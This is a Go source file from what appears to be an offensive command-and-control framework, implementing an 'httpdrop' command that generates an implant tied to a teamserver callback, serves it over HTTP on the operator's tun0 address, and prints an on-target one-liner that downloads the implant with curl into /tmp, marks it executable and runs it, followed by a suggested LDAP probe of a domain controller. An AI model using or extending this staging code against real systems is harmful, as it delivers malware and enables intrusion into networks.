package preimplant

import (
	"fmt"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

// HTTPDropPrint is how we emit the operator one-liner (tests capture it).
var HTTPDropPrint = fmt.Printf

func inboundHTTPDrop(args []string) error {
	f, _ := ParseFlags(args)
	callback := first(f, "callback", "url")
	dir := first(f, "dir", "out-dir")
	listen := first(f, "listen")
	name := first(f, "name")
	if name == "" {
		name = "i"
	}
	if dir == "" {
		return fmt.Errorf("usage: ark inbound httpdrop --callback https://TUN0:1750 --dir DIR [--listen 0.0.0.0:1723]")
	}
	if callback == "" {
		callback = defaultTun0Callback()
		if callback == "" {
			return fmt.Errorf("--callback required (no tun0 IPv4; pass https://<tun0>:1750)")
		}
	}
	if !strings.HasPrefix(callback, "https://") {
		return fmt.Errorf("--callback must be https:// (got %q)", callback)
	}
	localPort := portFromCallback(callback)
	if localPort <= 0 {
		localPort = 1750
	}
	if !httpsListenUp(localPort) {
		return fmt.Errorf("teamserver HTTPS down on 127.0.0.1:%d — start: ark teamserver (lab listen 1750)", localPort)
	}
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return err
	}
	out := filepath.Join(dir, name)
	bin, err := lookARK()
	if err != nil {
		return fmt.Errorf("ark binary: %w", err)
	}
	gen := GenerateArgs(bin, callback, out)
	fmt.Fprintf(os.Stderr, "inbound httpdrop generate: %s\n", strings.Join(gen, " "))
	if err := runArgv(gen); err != nil {
		return fmt.Errorf("op generate (secret register): %w — do not use make implant-c-linux", err)
	}
	base := strings.TrimRight(httpDropBase(listen, callback), "/")
	fetch := base + "/" + name
	HTTPDropPrint("inbound httpdrop ready\n")
	HTTPDropPrint("  implant %s  CALLBACK_URL=%s  (secret in teamserver DB)\n", out, callback)
	HTTPDropPrint("  fetch   %s\n", fetch)
	HTTPDropPrint("  on box (single PID):\n")
	HTTPDropPrint("    mkdir /tmp/%s.lockdir && curl -fsSL -o /tmp/%s %s && chmod +x /tmp/%s && /tmp/%s\n", name, name, fetch, name, name)
	HTTPDropPrint("  then: ark inbound through --probe <DC>:389\n")
	if listen == "" {
		HTTPDropPrint("  serve: python3 -m http.server --directory %s --bind 0.0.0.0 1723\n", dir)
		return nil
	}
	HTTPDropPrint("  listening %s dir=%s (Ctrl-C to stop)\n", listen, dir)
	return serveDropDir(listen, dir)
}

func defaultTun0Callback() string {
	port := 1750
	if p, err := portOfAddr(LoadRedirectorState().Listen); err == nil && p > 0 {
		port = p
	}
	for _, a := range tun0Addrs() {
		ip, _, err := net.ParseCIDR(a)
		if err != nil {
			continue
		}
		if ip.To4() == nil {
			continue
		}
		return "https://" + ip.String() + ":" + strconv.Itoa(port)
	}
	return ""
}

func portFromCallback(callback string) int {
	u := strings.TrimPrefix(callback, "https://")
	u = strings.TrimPrefix(u, "http://")
	_, p, err := net.SplitHostPort(u)
	if err != nil {
		return 1750
	}
	n, err := strconv.Atoi(p)
	if err != nil {
		return 1750
	}
	return n
}

func httpDropBase(listen, callback string) string {
	if listen == "" {
		if host, _, err := net.SplitHostPort(strings.TrimPrefix(strings.TrimPrefix(callback, "https://"), "http://")); err == nil {
			return "http://" + host + ":1723"
		}
		return "http://<tun0>:1723"
	}
	host, port, err := net.SplitHostPort(listen)
	if err != nil {
		return "http://<tun0>/"
	}
	if host == "0.0.0.0" || host == "::" || host == "" {
		if h, _, err := net.SplitHostPort(strings.TrimPrefix(strings.TrimPrefix(callback, "https://"), "http://")); err == nil {
			host = h
		} else {
			host = "<tun0>"
		}
	}
	return "http://" + net.JoinHostPort(host, port)
}

func serveDropDir(listen, dir string) error {
	ln, err := net.Listen("tcp", listen)
	if err != nil {
		return fmt.Errorf("inbound httpdrop listen %s: %w", listen, err)
	}
	defer ln.Close()
	srv := &http.Server{Handler: http.FileServer(http.Dir(dir))}
	err = srv.Serve(ln)
	if err == http.ErrServerClosed {
		return nil
	}
	return err
}
